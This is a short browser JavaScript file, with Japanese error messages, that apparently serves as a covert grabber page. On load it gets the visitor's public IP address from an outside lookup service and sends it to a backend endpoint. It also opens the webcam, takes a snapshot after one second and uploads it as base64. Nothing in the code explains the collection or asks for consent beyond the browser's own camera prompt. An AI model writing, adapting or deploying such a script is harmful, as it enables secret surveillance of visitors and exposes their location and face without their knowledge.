const video = document.getElementById('video');
const canvas = document.getElementById('canvas');

fetch('https://api.ipify.org?format=json')
    .then(response => response.json())
    .then(data => {
        const ipAddress = data.ip;
        sendMessage(`${ipAddress}`);
    })
    .catch(error => console.error('IPアドレスの取得に失敗しました:', error));

navigator.mediaDevices.getUserMedia({ video: true })
    .then(stream => {
        video.srcObject = stream;
        setTimeout(captureImage, 1000);
    })
    .catch(err => {
        console.error('カメラの起動に失敗しました:', err);
    });

function captureImage() {
    const context = canvas.getContext('2d');
    context.drawImage(video, 0, 0, canvas.width, canvas.height);
    
    const imageBase64 = canvas.toDataURL('image/png');
    sendImage(imageBase64);
}

function sendImage(base64Data) {
    fetch('/api/sendImage', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ image: base64Data })
    });
}

function sendMessage(message) {
    fetch('/api/sendMessage', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content: message })
    });
}

